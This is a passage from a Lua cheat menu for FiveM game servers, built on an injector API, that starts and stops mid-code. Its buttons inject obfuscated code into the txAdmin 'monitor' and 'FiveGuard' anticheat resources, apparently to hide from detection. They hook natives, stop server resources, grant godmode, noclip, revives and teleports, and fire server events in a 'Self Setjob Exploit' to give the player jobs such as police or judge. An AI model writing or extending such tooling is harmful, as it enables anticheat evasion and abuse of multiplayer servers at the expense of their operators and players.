                                    Citizen.SetTimeout(5000, function() if DoesEntityExist(veh) then DeleteEntity(veh) end end)
                                elseif mode == "Delete Entity" and hit then
                                    if DoesEntityExist(targetEntity) then
                                        NetworkRequestControlOfEntity(targetEntity)
                                        SetEntityAsMissionEntity(targetEntity, true, true)
                                        DeleteEntity(targetEntity)
                                    end
                                end
                            end
                        end
                        RenderScriptCams(false, true, 500, true, true)
                        if DoesCamExist(_G._fc_cam) then DestroyCam(_G._fc_cam) end
                        FreezeEntityPosition(PlayerPedId(), false)
                    end)
                end
            end

            Citizen.CreateThread(function()
                while _G.freecamMaster do
                    Wait(5)
                    if IsControlJustPressed(0, 311) then 
                        _G.freecamEnabled = not _G.freecamEnabled
                        _G.StartFreecam(_G.freecamEnabled)
                    end
                end
            end)
        ]===])
    end,
    function()
        MachoMenuNotification("Engkanto", "Freecam Disabled")
        MachoInjectResource("any", [[ _G.freecamMaster = false _G.freecamEnabled = false ]])
    end
)

-- FUNCTIONS
local armorSlider = MachoMenuSlider(PlayerTabSections[2], "Armor", 100, 0, 100, "", 0, function(val)
    SetPedArmour(PlayerPedId(), val)
end)

MachoMenuButton(PlayerTabSections[2], "Add Armor", function()
    local val = MachoMenuSlider(armorSlider)
    SetPedArmour(PlayerPedId(), val)
    MachoMenuNotification("Engkanto", "Armor set to " .. val)
end)



local healthSlider = MachoMenuSlider(PlayerTabSections[2], "Health", 200, 50, 200, "", 0, function(val)
    SetEntityHealth(PlayerPedId(), val)
end)

MachoMenuButton(PlayerTabSections[2], "Add Health", function()
    local val = MachoMenuSlider(healthSlider)
    SetEntityHealth(PlayerPedId(), val)
    MachoMenuNotification("Engkanto", "Health set to " .. val)
end)

local noclip = false
local noclipSpeed = 1
local originalCollision = {}
local selectedKey = 0

-- السلايدر للسرعة
local NoclipSpeedSlider = MachoMenuSlider(PlayerTabSections[2], "Noclip Speed", 1, 0.1, 10, "", 1, function(Value)
    noclipSpeed = Value
end)

-- دالة النوكليب الرئيسية
local function NoclipLoop()
    CreateThread(function()
        while noclip do
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local x, y, z = coords.x, coords.y, coords.z
            local speed = noclipSpeed
            local veh = GetVehiclePedIsIn(ped, 0)
            
            local entity
            if veh ~= 0 then
                entity = veh
            else
                entity = ped
            end

            SetEntityCollision(entity, false, false)
            SetEntityVelocity(entity, 0.0, 0.0, 0.0)

            -- التحكم في السرعة
            if IsControlPressed(0, 21) then -- Shift للسرعة
                speed = speed * 4
            elseif IsControlPressed(0, 19) then -- Alt للبطء
                speed = speed * 0.3
            end

            -- الحصول على اتجاه الكاميرا
            local camRot = GetGameplayCamRot(2)
            local camHeading = camRot.z
            local camPitch = camRot.x
            
            -- تحويل إلى راديان
            local headingRad = camHeading * 3.14159 / 180.0
            local pitchRad = camPitch * 3.14159 / 180.0
            
            -- حساب الاتجاه الثلاثي الأبعاد
            local dirX = -math.sin(headingRad) * math.cos(pitchRad)
            local dirY = math.cos(headingRad) * math.cos(pitchRad)
            local dirZ = math.sin(pitchRad)

            -- الحركة
            if IsControlPressed(0, 32) then -- W للأمام
                x = x + speed * dirX
                y = y + speed * dirY
                z = z + speed * dirZ
            end

            if IsControlPressed(0, 33) then -- S للخلف
                x = x - speed * dirX
                y = y - speed * dirY
                z = z - speed * dirZ
            end

            if IsControlPressed(0, 34) then -- A يسار
                local leftX = -math.cos(headingRad)
                local leftY = -math.sin(headingRad)
                x = x + speed * leftX
                y = y + speed * leftY
            end

            if IsControlPressed(0, 35) then -- D يمين
                local rightX = math.cos(headingRad)
                local rightY = math.sin(headingRad)
                x = x + speed * rightX
                y = y + speed * rightY
            end

            if IsControlPressed(0, 22) then -- Space للأعلى
                z = z + speed
            end

            if IsControlPressed(0, 36) then -- Ctrl للأسفل
                z = z - speed
            end

            SetEntityCoordsNoOffset(entity, x, y, z, true, true, true)
            
            -- للسيارة: توجيه حسب الكاميرا
            if veh ~= 0 then
                SetEntityHeading(veh, camHeading)
                local currentRot = GetEntityRotation(veh)
                SetEntityRotation(veh, camPitch, currentRot.y, camHeading, 2, true)
            end
            
            Wait(0)
        end
    end)
end

-- دالة تفعيل النوكليب
local function ActivateNoclip()
    noclip = true
    MachoMenuNotification("Engkanto", "NO CLIP MODE Activated - Speed: " .. noclipSpeed)
    
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, 0)
    
    -- حفظ حالة التصادم الأصلية
    originalCollision.ped = true
    if veh ~= 0 then
        originalCollision.veh = true
    end
    
    NoclipLoop()
end

-- دالة إلغاء النوكليب
local function DeactivateNoclip()
    noclip = false
    MachoMenuNotification("Engkanto", "NO CLIP MODE")
    
    -- إعادة تفعيل التصادم
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, 0)
    
    if originalCollision.ped then
        SetEntityCollision(ped, true, true)
    end
    if veh ~= 0 and originalCollision.veh then
        SetEntityCollision(veh, true, true)
    end
end

-- التشيك بوكس للنوكليب
MachoMenuCheckbox(PlayerTabSections[2], "Noclip Mode",
    function()
        ActivateNoclip()
    end,
    function()
        DeactivateNoclip()
    end
)

isNoclipEnabled = false
noclipSpeed = 1.0
local pendingNoclipSpeed = 1.0
local lastSliderValue = 10
local lastSliderUpdate = 0
local speedChangePending = false
local speedChangeTimer = 0

local noclipSpeedSliderValue = 10
local NoClipSpeedSlider = MachoMenuSlider(PlayerTabSections[2], "SkyDive", 10, 1, 500, "%", 0, function(Value)
    local currentTime = GetGameTimer()
    if Value ~= lastSliderValue and currentTime - lastSliderUpdate >= 100 then
        noclipSpeedSliderValue = Value
        pendingNoclipSpeed = Value / 10
        lastSliderValue = Value
        lastSliderUpdate = currentTime
        speedChangePending = true
        speedChangeTimer = currentTime
    end
end)

MachoMenuCheckbox(PlayerTabSections[2], "SkyDive Mode", 
    function()
        isNoclipEnabled = true
        local me = PlayerPedId()
        TaskSkyDive(me)
        MachoMenuNotification("Engkanto", "SkyDive activated")
    end,
    function()
        isNoclipEnabled = false
        local me = PlayerPedId()
        ClearPedTasks(me)
        MachoMenuNotification("Engkanto", "SkyDive deactivate")
    end

)

CreateThread(function()
    local me = PlayerPedId()
    local isInVehicle = false
    local shakeCounter = 0

    while true do
        Wait(0)

        local vehicle = GetVehiclePedIsIn(me, false)
        isInVehicle = vehicle ~= nil and vehicle ~= 0

        noclipSpeed = pendingNoclipSpeed

        if speedChangePending and isNoclipEnabled then
            local currentTime = GetGameTimer()
            if currentTime - speedChangeTimer >= 500 then
                isNoclipEnabled = false
                ClearPedTasks(me)
                Wait(0)
                isNoclipEnabled = true
                TaskSkyDive(me)
                speedChangePending = false
            end
        end

        if isNoclipEnabled then
            shakeCounter = shakeCounter + 1
            if shakeCounter >= 10 then
                StopGameplayCamShaking(true)
                ShakeGameplayCam("SKY_DIVING_SHAKE", 0.0)
                shakeCounter = 0
            end

            FreezeEntityPosition(me, true, false)
            SetEntityInvincible(me, true)

            if isInVehicle then
                SetEntityInvincible(vehicle, true)
            end

            if not isInVehicle then
                local x, y, z = table.unpack(GetEntityCoords(me, true))
                local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
                local pitch = GetGameplayCamRelativePitch()

                local dx = -math.sin(heading * math.pi / 180.0)
                local dy = math.cos(heading * math.pi / 180.0)
                local dz = math.sin(pitch * math.pi / 180.0)

                local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                if len ~= 0 then
                    dx = dx / len
                    dy = dy / len
                    dz = dz / len
                end

                local speed = noclipSpeed

                SetEntityVelocity(me, 0.0, 0.0, 0.0)

                local deltaTime = GetFrameTime()
                speed = speed * deltaTime * 60

                if IsControlPressed(0, 32) then
                    x = x + speed * dx
                    y = y + speed * dy
                    z = z + speed * dz
                end

                if IsControlPressed(0, 34) then
                    local leftVector = vector3(-dy, dx, 0.0)
                    x = x + speed * leftVector.x
                    y = y + speed * leftVector.y
                end

                if IsControlPressed(0, 269) then
                    x = x - speed * dx
                    y = y - speed * dy
                    z = z - speed * dz
                end

                if IsControlPressed(0, 9) then
                    local rightVector = vector3(dy, -dx, 0.0)
                    x = x + speed * rightVector.x
                    y = y + speed * rightVector.y
                end

                if IsControlPressed(0, 22) then
                    z = z + speed
                end

                if IsControlPressed(0, 62) then
                    z = z - speed
                end

                SetEntityCoordsNoOffset(me, x, y, z, true, true, true)
                SetEntityHeading(me, heading)
            else
                local x, y, z = table.unpack(GetEntityCoords(vehicle, true))
                local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(vehicle)
                local pitch = GetGameplayCamRelativePitch()

                local dx = -math.sin(heading * math.pi / 180.0)
                local dy = math.cos(heading * math.pi / 180.0)
                local dz = math.sin(pitch * math.pi / 180.0)

                local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                if len ~= 0 then
                    dx = dx / len
                    dy = dy / len
                    dz = dz / len
                end

                local speed = noclipSpeed

                local deltaTime = GetFrameTime()
                speed = speed * deltaTime * 60

                if IsControlPressed(0, 32) then
                    x = x + speed * dx
                    y = y + speed * dy
                    z = z + speed * dz
                end

                if IsControlPressed(0, 34) then
                    local leftVector = vector3(-dy, dx, 0.0)
                    x = x + speed * leftVector.x
                    y = y + speed * leftVector.y
                end

                if IsControlPressed(0, 269) then
                    x = x - speed * dx
                    y = y - speed * dy
                    z = z - speed * dz
                end

                if IsControlPressed(0, 9) then
                    local rightVector = vector3(dy, -dx, 0.0)
                    x = x + speed * rightVector.x
                    y = y + speed * rightVector.y
                end

                if IsControlPressed(0, 22) then
                    z = z + speed
                end

                if IsControlPressed(0, 62) then
                    z = z - speed
                end

                SetEntityCoordsNoOffset(vehicle, x, y, z, true, true, true)
                SetEntityHeading(vehicle, heading)
            end
        else
            SetEntityInvincible(me, false)
            FreezeEntityPosition(me, false, true)

            if isInVehicle then
                SetEntityInvincible(vehicle, false)
            end
        end
    end
end)
local superSpeedLoop = false

MachoMenuText(PlayerTabSections[2], "Self Actions")

MachoMenuButton(PlayerTabSections[2], "Heal & Armor", function()
    SetPedArmour(PlayerPedId(), 100)
    SetEntityHealth(PlayerPedId(), 200)
end)

MachoMenuButton(PlayerTabSections[2], "Heal | rryban", function()
    MachoHookNative(0x6B76DC1F3AE6E6A3, function()
    return true
end)
    MachoHookNative(0x15D757606D170C3C, function()
    return true
end)
    MachoHookNative(0xC7AE6AA1, function()
    return true
end)
    MachoInjectResource2(3, "esx_status", [[

local playerPed = PlayerPedId()
local playerId = PlayerId()
SetEntityHealth(playerPed, GetEntityMaxHealth(playerPed))
]])
end)

MachoMenuButton(PlayerTabSections[2], "Armor | rryban", function()
    MachoHookNative(0x4E3A0CC4, function()
    return true
end)
    MachoHookNative(0x77DFCCF5948B8C71, function()
    return true
end)
MachoInjectResource2(3, "esx_status", [[
local playerPed = PlayerPedId()
local playerId = PlayerId()
SetPlayerMaxArmour(playerPed, 100)
]])
end)

MachoMenuButton(PlayerTabSections[2], "Revive", function()
    MachoInjectResource2(3, CheckResource("ox_inventory") and "ox_inventory" or CheckResource("ox_lib") and "ox_lib" or CheckResource("es_extended") and "es_extended" or CheckResource("qb-core") and "qb-core" or CheckResource("wasabi_ambulance") and "wasabi_ambulance" or CheckResource("ak17_ambulancejob") and "ak17_ambulancejob" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function AcjU2NQzKw()
            if GetResourceState('prp-injuries') == 'started' then
                TriggerEvent('prp-injuries:hospitalBedHeal', skipHeal)
                return
            end

            if GetResourceState('xevi-deathscreen') == 'started' then
                TriggerEvent('xevi-deathscreen:revivePlayer')
                return
            end      
            
            if GetResourceState('gxvin-tdm') == 'started' then
                TriggerEvent('gxvin-tdm:client:forceRevive')
                return
            end                

            if GetResourceState('es_extended') == 'started' then
                TriggerEvent("esx_ambulancejob:revive")
                return
            end

            if GetResourceState('qb-core') == 'started' then
                TriggerEvent("hospital:client:Revive")
                return
            end

            if GetResourceState('qbx_core') == 'started' then
                TriggerEvent('qbx_medical:client:playerRevived')
                return
            end

            if GetResourceState('wasabi_ambulance') == 'started' then
                TriggerEvent("wasabi_ambulance:revive")
                return
            end

            if GetResourceState('ak17_ambulancejob') == 'started' then
                TriggerEvent("ak17_ambulancejob:revive")
                return
            end

            NcVbXzQwErTyUiO = GetEntityHeading(PlayerPedId())
            BvCxZlKjHgFdSaP = GetEntityCoords(PlayerPedId())

            RtYuIoPlMnBvCxZ = NetworkResurrectLocalPlayer
            RtYuIoPlMnBvCxZ(BvCxZlKjHgFdSaP.x, BvCxZlKjHgFdSaP.y, BvCxZlKjHgFdSaP.z, NcVbXzQwErTyUiO, false, false, false, 1, 0)
        end

        AcjU2NQzKw()
    ]])
end)

MachoMenuButton(PlayerTabSections[2], "Remove Crutch", function()
    MachoInjectResource2(3, "any", [[
                               local crutchResources = {
                                    "wasabi_crutch", "crutch", "original_crutch", "crutch_system",
                                    "crutch_script", "wc_crutch", "jr_crutch", "crutch_removal"
                                }
                                for _, res in ipairs(crutchResources) do
                                    if GetResourceState(res) == "started" then
                                        MachoResourceStop(res)
                                    end
                                end

                                -- 2. Trigger common removal events
                                local removalEvents = {
                                    "wasabi_crutch:client:removeCrutch",
                                    "crutch:client:remove",
                                    "crutch:remove",
                                    "removeCrutch",
                                    "crutch_system:remove",
                                    "wc_crutch:remove"
                                }
                                for _, event in ipairs(removalEvents) do
                                    TriggerEvent(event)
                                    TriggerServerEvent(event)
                                end

                                -- 3. Remove attached crutch prop (if any)
                                local ped = PlayerPedId()
                                local crutchModels = {
                                    GetHashKey("prop_crutch_01"),
                                    GetHashKey("prop_crutch_02"),
                                    GetHashKey("prop_crutch_03"),
                                    GetHashKey("prop_crutch_04"),
                                    GetHashKey("p_crutch_01_s"),
                                    GetHashKey("prop_crutch")
                                }

                                -- Check attached props
                                local attachedProps = GetEntityAttachedTo(ped) or 0
                                if attachedProps ~= 0 and DoesEntityExist(attachedProps) then
                                    local model = GetEntityModel(attachedProps)
                                    for _, crutchHash in ipairs(crutchModels) do
                                        if model == crutchHash then
                                            DeleteEntity(attachedProps)
                                            break
                                        end
                                    end
                                end

                                -- Check nearby props
                                local objects = GetGamePool('CObject')
                                for _, obj in ipairs(objects) do
                                    if DoesEntityExist(obj) then
                                        local model = GetEntityModel(obj)
                                        for _, crutchHash in ipairs(crutchModels) do
                                            if model == crutchHash then
                                                local dist = #(GetEntityCoords(ped) - GetEntityCoords(obj))
                                                if dist < 2.0 then
                                                    DeleteEntity(obj)
                                                end
                                                break
                                            end
                                        end
                                    end
                                end

                                -- 4. Clear any limping or crutch animation (FIXED: replaced ResetPedMovementBlend)
                                ClearPedTasksImmediately(ped)
                                ResetPedMovementClipset(ped, 0.0) -- Tamang native
                                SetPedMoveRateOverride(ped, 1.0)
                                ResetPedStrafeClipset(ped)
                                ResetPedWeaponMovementClipset(ped)

                                -- 5. Force ragdoll reset (sometimes fixes stuck animation)
                                SetPedToRagdoll(ped, 1, 1, 0, false, false, false)
                            end
                        end
                    end
                end
            ]])
        end)

MachoMenuButton(PlayerTabSections[2], "Revive Native", function()
    MachoInjectResource2(3, "any", [[
        local myPed = PlayerPedId()
        local coords = GetEntityCoords(myPed)
        local heading = GetEntityHeading(myPed)

        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
        
        SetEntityHealth(myPed, 200)
        ClearPedBloodDamage(myPed)

        ResurrectPed(myPed)
        ClearPedTasksImmediately(myPed)
 
        isDead = false
        InLastStand = false
        exports['qbx_medical']:SetDeathStatus(false)
    ]])
    MachoMenuNotification("Engkanto", "Native Revive Executed")
end)

MachoMenuButton(PlayerTabSections[2], "Suicide", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function RGybF0JqEt()
            local aSdFgHjKlQwErTy = SetEntityHealth
            aSdFgHjKlQwErTy(PlayerPedId(), 0)
        end

        RGybF0JqEt()
    ]])
end)

MachoMenuButton(PlayerTabSections[2], "Force Ragdoll", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function awfAEDSADWEf()
            local cWAmdjakwDksFD = SetPedToRagdoll
            cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
        end

        awfAEDSADWEf()
    ]])
end)

MachoMenuText(PlayerTabSections[2], "Self Setjob Exploit")

local commonJobDropHandle = MachoMenuDropDown(PlayerTabSections[2], "Select Job",
    function(Index) end,
    "None",
    "police",
    "ambulance",
    "mechanic",
    "taxi",
    "realestate",
    "banker",
    "judge",
    "lawyer",
    "cardealer"
)

local commonJobGradeInput = MachoMenuInputbox(PlayerTabSections[2], "What Grade?", "Ex. 1-9 | 0 For Unemployed")

local commonJobNames = {"none", "police", "ambulance", "mechanic", "taxi", "realestate", "banker", "judge", "lawyer", "cardealer"}
local selectedCommonJob = 1

MachoMenuButton(PlayerTabSections[2], "Apply Job", function()
    local grade = tonumber(MachoMenuGetInputbox(commonJobGradeInput)) or 0
    local job = commonJobNames[selectedCommonJob] or "unemployed"
    MachoInjectResource('monitor', string.format([[
        TriggerServerEvent('esx:setJob', '%s', %d)
        TriggerServerEvent('QBCore:Server:SetJob', '%s', %d)
    ]], job, grade, job, grade))
    MachoMenuNotification("Engkanto", "Job: " .. job .. " Grade: " .. grade)
end)

local otherJobInput = MachoMenuInputbox(PlayerTabSections[2], "What Job?", "Ex. cardealer")
local otherJobGradeInput = MachoMenuInputbox(PlayerTabSections[2], "What Grade?", "Ex. 1-9")

MachoMenuButton(PlayerTabSections[2], "Apply Job II", function()
    local job = MachoMenuGetInputbox(otherJobInput)
    local grade = tonumber(MachoMenuGetInputbox(otherJobGradeInput)) or 0
    if not job or job == "" then
        MachoMenuNotification("Engkanto", "Enter a job name!")
        return
    end
    MachoInjectResource('monitor', string.format([[
        TriggerServerEvent('esx:setJob', '%s', %d)
        TriggerServerEvent('QBCore:Server:SetJob', '%s', %d)
    ]], job, grade, job, grade))
    MachoMenuNotification("Engkanto", "Job: " .. job .. " Grade: " .. grade)
end)

local SelectedFramework = "ESX"
local JobInputHandle = MachoMenuInputbox(PlayerTabSections[2], "Job Name", "police") 
local GradeInputHandle = MachoMenuInputbox(PlayerTabSections[2], "Job Grade", "0")

MachoMenuDropDown(PlayerTabSections[2], "Select Framework", function(Index)
    local Frameworks = {"ESX", "QBCore", "QBX", "CFX"}
    SelectedFramework = Frameworks[Index + 1] or "ESX"
end, "ESX", "QBCore", "QBX", "CFX")

MachoMenuButton(PlayerTabSections[2], "Apply Job III", function()
    local name = MachoMenuGetInputbox(JobInputHandle)
    local gradeStr = MachoMenuGetInputbox(GradeInputHandle)
    local grade = tonumber(gradeStr) or 0

    if name == "" or name == "..." then return end

    if SelectedFramework == "ESX" or SelectedFramework == "Any" then
        MachoInjectResource('monitor', string.format([[
            local name, grade = "%s", %d
            TriggerEvent('esx:setJob', { name = name, grade = grade, label = "Injected" })
            if ESX and ESX.PlayerData then 
                ESX.PlayerData.job = { name = name, grade = grade, label = "Injected" } 
            end
        ]], name, grade))
    end

    if SelectedFramework == "QBCore" or SelectedFramework == "Any" then
        MachoInjectResource('monitor', string.format([[
            local name, grade = "%s", %d
            TriggerEvent('QBCore:Client:OnJobUpdate', { name = name, grade = { level = grade }, label = "Injected" })
            if QBCore and QBCore.Functions and QBCore.Functions.GetPlayerData then
                local pData = QBCore.Functions.GetPlayerData()
                if pData then pData.job = { name = name, grade = { level = grade }, label = "Injected" } end
            end
        ]], name, grade))
    end

    if SelectedFramework == "QBX" or SelectedFramework == "Any" then
        MachoInjectResource('monitor', string.format([[
            local name, grade = "%s", %d
            TriggerEvent('qbx_core:client:OnJobUpdate', { name = name, grade = grade })
        ]], name, grade))
    end

    if SelectedFramework == "CFX" or SelectedFramework == "Any" then
        MachoInjectResource('monitor', string.format([[
            local name, grade = "%s", %d
            TriggerEvent('player:setJob', name, grade)
            TriggerServerEvent('fivem:setJob', name, grade)
        ]], name, grade))
    end
end)

MachoMenuText(PlayerTabSections[2], "Other")

local radioFreqInput = MachoMenuInputbox(PlayerTabSections[2], "Frequency", "Put The Frequency Here")

MachoMenuButton(PlayerTabSections[2], "Connect To Radio", function()
    local freq = MachoMenuGetInputbox(radioFreqInput)
    if not freq or freq == "" then
        MachoMenuNotification("Engkanto", "Enter a frequency!")
        return
    end
    TriggerEvent('mm_radio:client:use')
    TriggerServerEvent('mm_radio:server:setFrequency', tonumber(freq) or 0)
    TriggerEvent('pma-voice:setRadioChannel', tonumber(freq) or 0)
    MachoMenuNotification("Engkanto", "Connected to frequency: " .. freq)
end)



-- Teleport Tab
local CoordsHandle = MachoMenuInputbox(TeleportTabSections[1], "Coords:", "x, y, z")
MachoMenuButton(TeleportTabSections[1], "Teleport to Coords", function()
    local zXcVbNmQwErTyUi = MachoMenuGetInputbox(CoordsHandle)

    if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= "" then
        local aSdFgHjKlQwErTy, qWeRtYuIoPlMnBv, zLxKjHgFdSaPlMnBv = zXcVbNmQwErTyUi:match("([^,]+),%s*([^,]+),%s*([^,]+)")
        aSdFgHjKlQwErTy = tonumber(aSdFgHjKlQwErTy)
        qWeRtYuIoPlMnBv = tonumber(qWeRtYuIoPlMnBv)
        zLxKjHgFdSaPlMnBv = tonumber(zLxKjHgFdSaPlMnBv)

        if aSdFgHjKlQwErTy and qWeRtYuIoPlMnBv and zLxKjHgFdSaPlMnBv then
            MachoInjectResource(CheckResource("monitor") and "monitor" or "any", string.format([[
                local function b0NtdqLZKW()
                    local uYiTpLaNmZxCwEq = SetEntityCoordsNoOffset
                    local nHgFdSaZxCvBnMq = PlayerPedId
                    local XvMzAsQeTrBnLpK = IsPedInAnyVehicle
                    local QeTyUvGhTrBnAzX = GetVehiclePedIsIn
                    local BvNzMkJdHsLwQaZ = GetGroundZFor_3dCoord

                    local x, y, z = %f, %f, %f
                    local found, gZ = BvNzMkJdHsLwQaZ(x, y, z + 1000.0, true)
                    if found then z = gZ + 1.0 end

                    local ent = XvMzAsQeTrBnLpK(nHgFdSaZxCvBnMq(), false) and QeTyUvGhTrBnAzX(nHgFdSaZxCvBnMq(), false) or nHgFdSaZxCvBnMq()
                    uYiTpLaNmZxCwEq(ent, x, y, z, false, false, false)
                end

                b0NtdqLZKW()
            ]], aSdFgHjKlQwErTy, qWeRtYuIoPlMnBv, zLxKjHgFdSaPlMnBv))
        end
    end
end)

MachoMenuButton(TeleportTabSections[1], "Teleport To Waypoint", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function xQX7uzMNfb()
            local mNbVcXtYuIoPlMn = GetFirstBlipInfoId
            local zXcVbNmQwErTyUi = DoesBlipExist
            local aSdFgHjKlQwErTy = GetBlipInfoIdCoord
            local lKjHgFdSaPlMnBv = PlayerPedId
            local qWeRtYuIoPlMnBv = SetEntityCoords

            local function XcVrTyUiOpAsDfGh()
                local RtYuIoPlMnBvZx = mNbVcXtYuIoPlMn(8)
                if not zXcVbNmQwErTyUi(RtYuIoPlMnBvZx) then return nil end
                return aSdFgHjKlQwErTy(RtYuIoPlMnBvZx)
            end

            local GhTyUoLpZmNbVcXq = XcVrTyUiOpAsDfGh()
            if GhTyUoLpZmNbVcXq then
                local QwErTyUiOpAsDfGh = lKjHgFdSaPlMnBv()
                qWeRtYuIoPlMnBv(QwErTyUiOpAsDfGh, GhTyUoLpZmNbVcXq.x, GhTyUoLpZmNbVcXq.y, GhTyUoLpZmNbVcXq.z + 5.0, false, false, false, true)
            end
        end

        xQX7uzMNfb()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Teleport To Waypoint II", function()
    local waypoint = GetFirstBlipInfoId(8)
    
    if DoesBlipExist(waypoint) then
        local coords = GetBlipInfoIdCoord(waypoint)
        MachoMenuNotification("Teleport", "Teleporting to Waypoint...")
        MachoInjectResource("monitor", string.format([[
            Citizen.CreateThread(function()
                local entity = PlayerPedId()
                if IsPedInAnyVehicle(entity, false) then
                    entity = GetVehiclePedIsIn(entity, false)
                end

                local tx, ty = %f, %f
                local groundFound = false
                local posZ = 0.0

                FreezeEntityPosition(entity, true)
                
                SetEntityCoordsNoOffset(entity, tx, ty, 800.0, false, false, false)
                Wait(500) 

                for i = 950, 0, -50 do
                    SetEntityCoordsNoOffset(entity, tx, ty, i + 0.0, false, false, false)
                    Wait(0)
                    local found, z = GetGroundZFor_3dCoord(tx, ty, i + 0.0, 0)
                    if found then
                        posZ = z + 1.0 
                        groundFound = true
                        break
                    end
                end

                if groundFound then
                    SetEntityCoordsNoOffset(entity, tx, ty, posZ, false, false, true)
                    if IsPedInAnyVehicle(PlayerPedId(), false) then
                        SetVehicleOnGroundProperly(entity)
                    end
                else
                    SetEntityCoordsNoOffset(entity, tx, ty, 100.0, false, false, true)
                end

                FreezeEntityPosition(entity, false)
            end)
        ]], coords.x, coords.y))
    else
        MachoMenuNotification("Teleport Error", "Set a Waypoint first!")
    end
end)

MachoMenuButton(TeleportTabSections[1], "Print Current Coords", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function Xy9TqLzVmN()
            local zXcVbNmQwErTyUi = GetEntityCoords
            local aSdFgHjKlQwErTy = PlayerPedId

            local coords = zXcVbNmQwErTyUi(aSdFgHjKlQwErTy())
            local x, y, z = coords.x, coords.y, coords.z
            print(string.format("[^3Engkanto^7] [^4DEBUG^7]  %.2f, %.2f, %.2f", x, y, z))
        end

        Xy9TqLzVmN()
    ]])
end)

MachoMenuButton(TeleportTabSections[1], "Print Current Coords II", function()
  
    if MachoResourceInjectable("monitor") then
        MachoInjectResource("monitor", [[
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)

            local x = math.floor(coords.x * 100) / 100
            local y = math.floor(coords.y * 100) / 100
            local z = math.floor(coords.z * 100) / 100
            local h = math.floor(heading * 100) / 100

            print("---------------------------------------")
            print("^2[VECTOR GENERATOR]^7")
            print(string.format("^3Vector3:^7 vector3(%.2f, %.2f, %.2f)", x, y, z))
            print(string.format("^3Vector4:^7 vector4(%.2f, %.2f, %.2f, %.2f)", x, y, z, h))
            print(string.format("^3Table:^7 {x = %.2f, y = %.2f, z = %.2f}", x, y, z))
            print("---------------------------------------")
        ]])
    else
        print("^1[Engkanto]^7 Target resource 'monitor' not found.")
    end
end)

local locations = {
    "None",
    "Maze Bank",
    "Airport",
    "Sandy Shores",
    "Paleto Bay",
    "Vinewood Hills",
    "Del Perro Pier",
    "Fort Zancudo",
    "Alamo Sea",
    "POTANGINAMO SPOT",
    "LSIA",
}

local locationCoords = {
    {0, 0, 0},
    {-75.0, -818.0, 326.0},
    {-1034.0, -2733.0, 20.0},
    {1853.0, 3689.0, 34.0},
    {-270.0, 6225.0, 31.0},
    {-1644.0, 195.0, 131.0},
    {-1839.0, -1231.0, 13.0},
    {-2047.0, 3132.0, 32.0},
    {1209.0, 4113.0, 38.0},
    {6205.81, -2846.93, -1.89},
    {-1336.0, -3044.0, 14.0},
}

local selectedLocation = 1
local LocationDropHandle = MachoMenuDropDown(TeleportTabSections[1], "Locations",
    function(Index)
        selectedLocation = Index + 1
    end,
    "None", "Maze Bank", "Airport", "Sandy Shores", "Paleto Bay",
    "Vinewood Hills", "Del Perro Pier", "Fort Zancudo", "Alamo Sea", "POTANGINAMO SPOT", "LSIA"
)

MachoMenuButton(TeleportTabSections[1], "Teleport", function()
    if selectedLocation == 1 then
        MachoMenuNotification("Engkanto", "Select a location first!")
        return
    end
    local c = locationCoords[selectedLocation]
    SetEntityCoordsNoOffset(PlayerPedId(), c[1], c[2], c[3], false, false, false)
    MachoMenuNotification("Engkanto", "Teleported to " .. locations[selectedLocation])
end)

-- Vehicle Tab
MachoMenuCheckbox(VehicleTabSections[1], "Vehicle Godmode", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
        zXcVbNmQwErTyUi = true

        local function LWyZoXRbqK()
            local LkJhGfDsAzXcVb = CreateThread
            LkJhGfDsAzXcVb(function()
                while zXcVbNmQwErTyUi and not Unloaded do
                    local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                    local TyUiOpAsDfGhJkL = PlayerPedId
                    local AsDfGhJkLzXcVbN = SetEntityInvincible

                    local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), false)
                    if vehicle and vehicle ~= 0 then
                        AsDfGhJkLzXcVbN(vehicle, true)
                    end
                    Wait(0)
                end
            end)
        end

        LWyZoXRbqK()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        zXcVbNmQwErTyUi = false
        local QwErTyUiOpAsDfG = GetVehiclePedIsIn
        local TyUiOpAsDfGhJkL = PlayerPedId
        local AsDfGhJkLzXcVbN = SetEntityInvincible

        local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), true)
        if vehicle and vehicle ~= 0 then
            AsDfGhJkLzXcVbN(vehicle, false)
        end
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Force Vehicle Engine", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
        GhYtReFdCxWaQzLp = true

        local function OpAsDfGhJkLzXcVb()
            local lMnbVcXzZaSdFg = CreateThread
            lMnbVcXzZaSdFg(function()
                local QwErTyUiOp         = _G.PlayerPedId
